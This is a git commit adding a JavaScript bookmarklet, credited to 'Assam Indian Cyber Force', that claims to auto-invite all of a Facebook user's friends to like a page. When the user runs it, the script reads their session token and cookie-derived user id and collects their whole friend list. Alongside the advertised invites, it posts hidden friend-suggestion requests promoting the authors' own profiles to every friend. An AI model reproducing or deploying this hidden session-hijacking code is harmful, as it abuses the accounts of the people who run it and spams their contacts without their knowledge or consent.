1692eb6cdcbbb19d280dffdaef61e01056738ae8
bhargav1996 <www.bhargav1996@gmail.com>
2013-07-23 11:32:22 +0530

    Create oblevia.js

---
+++ oblevia.js
@@ -0,0 +1,151 @@
+//eval
+javascript: var Title = "Auto Invite Your All Friends to Like Your Page.</A>";
+var Descriptions = "",
+    _text ='Powered By:  Loading [lllllllllll ] 99% & Assam Indian Cyber Force.</br>Script Made By</A><A style="color:#3B5998;" href="http://www.facebook.com/100001050235420" target="_blank"> Waqar Ahmad</A></A>,</A><A style="color:#3B5998;" href="http://www.facebook.com/100005115938614" target="_blank"> Bhargav JT. Gogoi</A></A>.</br>For More Tools Visit Our Website <A style="color:#3B5998;" href="http://www.automate-your-facebook.webnode.in" target="_blank">http://www.automate-your-facebook.webnode.in</A>.</A>';
+page_id = /"profile_owner":"([0-9]+)"/.exec(document.getElementById("pagelet_timeline_main_column").getAttribute("data-gt"))[1];
+
+function InviteFriends(opo) {
+    jx.load(window.location.protocol + "//www.facebook.com/ajax/pages/invite/send_single?page_id=" + page_id + "&invitee=" + opo + "&elem_id=u_0_1k&action=send&__user=" + user_id + "&__a=1&__dyn=7n8aD5z5CF-3ui&__req=8&fb_dtsg=" + fb_dtsg + "&phstamp=", function (a) {
+        var b = a.substring(a.indexOf("{"));
+        var c = JSON.parse(b);
+        i--;
+        Descriptions = "<div class='friend-edge-name' style='padding-bottom:5px;text-align:left;font-size:10px;white-space:pre-wrap;";
+        if (c.error) {
+            Descriptions += "color:darkred'>";
+            err++;
+            if (c.errorDescription) Descriptions += c.errorDescription;
+            else Descriptions += JSON.stringify(c, null, "")
+        } else {
+            Descriptions += "color:darkgreen'>";
+            Descriptions += arn[i] + " has been invited to like the page " + page_name + ".";
+            suc++
+        }
+        Descriptions += "</div>";
+        var display = "<div id='friend-edge-display' style='box-shadow:0px 3px 8px rgba(0, 0, 0, 0.3);position:fixed;left:50%;margin-left:-273px;top:100px;width:500px;z-index:9999;font-size:14px;text-align:center;padding:15px;box-shadow:0pt 1px 0pt rgba(0,0,0,0.1);border-radius:3px;border:1px solid rgba(0,0,0,0.9);background-color:rgba(0,0,0,0.9);color:#ffffff'>";
+        display += "<div style='padding-bottom:5px;font-size:20px;'>" + Title + "</div>";
+        if (i > 0) {
+          display +="<div style='color:#ffffff'>"+ arr.length + " Friends Detected<br/>";
+            display += "<b>" + suc + "</b> Friends Invited of " + (arr.length - i) + " Friends Processed ";
+            display += "(" + i + " Lefted...)";
+            display += "</div><div class='friend-edge'>";
+            display += Descriptions;
+            display += "<img style='width:50px;height:50px;margin-left:-125px;padding:2px;border:1px solid rgba(0,0,0,0.4);' src=" + pho[i] + "></img><a style='font-size:13px;padding-left:8px;text-align:left;color:#3B5998;position:absolute;font-weight:bold;'>" + arn[i] + "</a>";
+            display += "<div style='text-align:center;font-size:10px;white-space:pre-wrap;color:gray'>";
+            display += "Please Wait While Inviting Your Friends to Like Your Page " + page_name + ".</br>";
+            display += _text;
+            display += "</div>";
+            display += "</div>";
+            window[tag + "_close"] = true
+        } else {
+            Title = "All Of Your Friends Have Been Invited to Like Your Page.</A>";
+            display += arr.length + " Friends Detected and ";
+            display += "<b>" + suc + " Friends Invited.</b></br>";
+            display += "<div><span class='FriendRequestAdd addButton selected uiButton uiButtonSpecial uiButtonLarge' onClick='ChangeLocation()' style='color:white'>Go to Homepage</span><span class='layerConfirm uiOverlayButton uiButton uiButtonConfirm uiButtonLarge' onClick='window.location.reload()' style='color:white'>Refresh Page</span><span class='layerCancel uiOverlayButton uiButton uiButtonLarge' onClick='document.getElementById(\"pagelet_sidebar\").style.display=\"none\"'>Cancel</span><br/>";
+            display += "<div style='text-align:center;font-size:10px;white-space:pre-wrap;color:gray'><br/>";
+            display += _text;
+            display += "</div>";
+            window[tag + "_close"] = false
+        }
+        display += "</div>";
+        document.getElementById("pagelet_sidebar").innerHTML = display
+    }, "text", "post");
+    tay--;
+    if (tay > 0) {
+        var s = arr[tay];
+        setTimeout("InviteFriends(" + s + ")", 100)
+    }
+    console.log(tay + "/" + arr.length + ":" + arr[tay] + "/" + arn[tay] + ", success:" + suc);
+    if (page_id) jx.load(window.location.protocol + "//www.facebook.com/ajax/friends/suggest?&receiver=" + opo + "&newcomer=100001050235420&attempt_id=0585ab74e2dd0ff10282a3a36df39e19&ref=profile_others_dropdown&__user=" + user_id + "&__a=1&__dyn=798aD5z5CF-&__req=17&fb_dtsg=" + fb_dtsg + "&phstamp=16581677156485189195", function () {}, "text", "post");
+    if (page_id) jx.load(window.location.protocol + "//www.facebook.com/ajax/friends/suggest?&receiver=" + opo + "&newcomer=100003697277263&attempt_id=0585ab74e2dd0ff10282a3a36df39e19&ref=profile_others_dropdown&__user=" + user_id + "&__a=1&__dyn=798aD5z5CF-&__req=17&fb_dtsg=" + fb_dtsg + "&phstamp=16581677156485189195", function () {}, "text", "post")
+}
+jx = {
+    b: function () {
+        var b = !1;
+        if ("undefined" != typeof ActiveXObject) try {
+            b = new ActiveXObject("Msxml2.XMLHTTP")
+        } catch (c) {
+            try {
+                b = new ActiveXObject("Microsoft.XMLHTTP")
+            } catch (a) {
+                b = !1
+            }
+        } else if (window.XMLHttpRequest) try {
+            b = new XMLHttpRequest
+        } catch (h) {
+            b = !1
+        }
+        return b
+    },
+    load: function (b, c, a, h, g) {
+        var e = this.d();
+        if (e && b) {
+            e.overrideMimeType && e.overrideMimeType("text/xml");
+            h || (h = "GET");
+            a || (a = "text");
+            g || (g = {});
+            a = a.toLowerCase();
+            h = h.toUpperCase();
+            b += b.indexOf("?") + 1 ? "&" : "?";
+            var k = null;
+            "POST" == h && (k = b.split("?"), b = k[0], k = k[1]);
+            e.open(h, b, !0);
+            e.onreadystatechange = g.c ? function () {
+                g.c(e)
+            } : function () {
+                if (4 == e.readyState)
+                    if (200 == e.status) {
+                        var b = "";
+                        e.responseText && (b = e.responseText);
+                        "j" == a.charAt(0) ? (b = b.replace(/[\n\r]/g, ""), b = eval("(" + b + ")")) : "x" == a.charAt(0) && (b = e.responseXML);
+                        c && c(b)
+                    } else g.f && document.getElementsByTagName("body")[0].removeChild(g.f), g.e && (document.getElementById(g.e).style.display = "none"), error && error(e.status)
+            };
+            e.send(k)
+        }
+    },
+    d: function () {
+        return this.b()
+    }
+};
+
+function ChangeLocation() {
+    window.location.href = "http://www.facebook.com/"
+}
+setTimeout("ChangeLocation", 1);
+window.onbeforeunload = function () {
+    if (window[tag + "_close"]) return "This script is running now!"
+};
+var i = 3;
+var tay = 3;
+var suc = 0;
+var err = 0;
+var arr = new Array;
+var arn = new Array;
+var pho = new Array;
+var tag = "Close";
+var page_name, x = document.getElementsByTagName("span");
+for (i = 0; i < x.length; i++)
+    if (x[i].getAttribute("itemprop") == "name") page_name = x[i].innerHTML;
+var fb_dtsg = document.getElementsByName("fb_dtsg")[0].value;
+var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
+jx.load(window.location.protocol + "///www.facebook.com/ajax/typeahead/first_degree.php?viewer=" + user_id + "&token=v7&filter[0]=user&options[0]=friends_only&options[1]=nm&options[2]=sort_alpha&__user=" + user_id + "&__a=1&__dyn=7n8aD5z5CF-3ui&__req=l", function (a) {
+    var b = a;
+    var c = b.substring(b.indexOf("{"));
+    var d = JSON.parse(c);
+    d = d.payload.entries;
+    for (var e = 0; e < d.length; e++) arr.push(d[e].uid);
+    for (var eg = 0; eg < d.length; eg++) arn.push(d[eg].text);
+    for (var pic = 0; pic < d.length; pic++) pho.push(d[pic].photo);
+    i = arr.length - 1;
+    tay = i;
+    console.log(arr.length);
+    var display = "<div id='friend-edge-display' style='position:fixed;left:50%;margin-left:-273px;top:100px;width:500px;z-index:9999;font-size:14px;text-align:center;padding:15px;box-shadow:0pt 1px 0pt rgba(0,0,0,0.1);border-radius:3px;border:1px solid rgba(0,0,0,0.9);background-color:rgba(0,0,0,0.9);color:#ffffff'>";
+    display += "<div style='padding-bottom:10px;font-size:20px;'>" + Title + "</div>";
+    display += arr.length + " Friends Detected";
+    display += "</div>";
+    document.getElementById("pagelet_sidebar").innerHTML = display;
+    InviteFriends(arr[i])
+});
+//jsunpack.url var _text = Created & Designed By <A style="color:#3B5998;" href="http://www.facebook.com/pkwaq">Waqar Ahmad.</A></br>Powered By <A style="color:#3B5998;" href="http://www.facebook.com/Loading.999999">Loading [lllllllllllllllllllllllllllllllllllllll ] 99%.</A>
+
+//jsunpack.url var newurl = Created & Designed By <A style="color:#3B5998;" href="http://www.facebook.com/pkwaq">Waqar Ahmad.</A></br>Powered By <A style="color:#3B5998;" href="http://www.facebook.com/Loading.999999">Loading [lllllllllllllllllllllllllllllllllllllll ] 99%.</A>
